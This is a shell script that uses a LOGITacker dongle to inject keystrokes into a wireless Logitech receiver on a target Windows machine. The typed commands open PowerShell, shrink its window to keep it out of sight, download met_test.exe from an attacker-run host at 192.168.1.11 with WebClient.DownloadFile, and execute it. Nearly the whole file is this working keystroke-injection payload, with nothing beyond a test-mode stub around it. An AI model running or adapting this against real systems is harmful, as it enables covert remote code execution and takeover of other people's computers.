#!/bin/ksh
#set -x

# check for /dev/ttyACM0
check_for_ACM0=$(ls -l /dev/ttyACM0)
if [[ -z $check_for_ACM0 ]]; then
echo "Can't execute payload because dongle is not present on /dev/ttyACM0"
exit 1
fi

if [[ -z $1 ]]; then
echo "No argument passed."
echo "Exiting."
exit 1
fi

# clean up LOGITacker screen session just in case
get_pid_of_LOGITacker_screen=$(screen -list | grep 'LOGITacker_screen' | awk -F'.' '{print $1}' | awk '{$1=$1;print}')
if [[ ! -z $get_pid_of_LOGITacker_screen ]]; then
kill $get_pid_of_LOGITacker_screen
fi

# run this script to attach to /dev/ttyACM0 via screen in Linux and execute the payload
if [[ $1 = "AA:BB:CC:DD:EE" ]]; then
echo "Test mode."
else
# small delays with python for reliability
# no delays result in unreliable execution
screen -mdS "LOGITacker_screen" /dev/ttyACM0
screen -x LOGITacker_screen -p 0 -X stuff "devices add ${1}"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "devices add ${1}"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script clear"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press GUI R"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script delay 1000"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script altstring powershell.exe"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press ENTER"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script delay 1000"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 4"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string h"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press EQUAL"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 9"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string Get"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press MINUS"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string Process"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SPACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press MINUS"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string Id"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SPACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 4"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string pid"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 0"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string .MainWindowHandle"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SEMICOLON"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 4"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string ios"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press EQUAL"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press LEFTBRACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string Runtime.InteropServices.HandleRef"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press RIGHTBRACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SEMICOLON"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 4"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string hw"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press EQUAL"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string New"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press MINUS"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string Object"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SPACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 4"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string ios"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SPACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 9"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string 1"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press COMMA"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 4"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string h"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 0"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SEMICOLON"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 4"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string i"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press EQUAL"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string New"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press MINUS"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string Object"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SPACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 4"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string ios"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 9"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string 2"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press COMMA"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string 0"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 0"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SEMICOLON"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 9"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 9"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press LEFTBRACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string reflection.assembly"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press RIGHTBRACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT SEMICOLON"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT SEMICOLON"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string LoadWithPartialName"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 9"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT APOSTROPHE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string WindowsBase"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT APOSTROPHE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 0"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 0"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string .GetType"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 9"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT APOSTROPHE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string MS.Win32.UnsafeNativeMethods"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT APOSTROPHE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 0"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 0"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT SEMICOLON"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT SEMICOLON"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string SetWindowPos"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 9"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 4"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string hw"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press COMMA"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 4"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string i"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press COMMA"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string 0"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press COMMA"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string 0"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press COMMA"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string 100"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press COMMA"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string 100"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press COMMA"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string 16512"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 0"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press ENTER"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script delay 1000"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 7"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SPACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT LEFTBRACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 9"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string New"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press MINUS"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string Object"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SPACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string System.Net.WebClient"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 0"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string .DownloadFile"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 9"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press APOSTROPHE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string http"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT SEMICOLON"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SLASH"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SLASH"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string 192.168.1.11"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SLASH"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string met"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT MINUS"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string test.exe"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press APOSTROPHE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press COMMA"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press APOSTROPHE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string met"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT MINUS"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string test.exe"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press APOSTROPHE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT 0"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SEMICOLON"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SPACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string Start"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press MINUS"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string Process"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SPACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string met"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SHIFT MINUS"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string test.exe"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press SPACE"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press MINUS"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script string NoNewWindow"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press ENTER"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "script press RETURN"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "inject target ${1}"`echo -ne '\015'`
python3 -c "import time; time.sleep(0.05)"
screen -x LOGITacker_screen -p 0 -X stuff "inject execute"`echo -ne '\015'`
get_pid_of_LOGITacker_screen=$(screen -list | grep 'LOGITacker_screen' | awk -F'.' '{print $1}' | awk '{$1=$1;print}')
kill $get_pid_of_LOGITacker_screen
echo "Payload executed."
fi

